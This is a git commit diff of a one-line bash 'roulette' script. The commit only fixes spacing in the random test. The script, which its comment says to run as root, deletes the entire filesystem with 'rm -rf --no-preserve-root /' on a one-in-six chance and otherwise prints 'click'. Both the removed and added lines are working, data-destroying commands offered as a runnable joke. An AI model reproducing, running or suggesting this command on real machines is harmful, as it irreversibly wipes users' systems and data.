e0c4f3115d4fd2670900348a3bcda816d7d7b033
Wyatt <58761269+wyattboyer@users.noreply.github.com>
2023-01-07 18:01:47 -0500

    syntax

--- roulette.sh
+++ roulette.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 # Wyatt Boyer - 2023
 # login as root
-[ $[ $RANDOM % 6] == 0 ] && rm -rf --no-preserve-root / || echo "click"
+[ $[ $RANDOM % 6 ] == 0 ] && rm -rf --no-preserve-root / || echo "click"
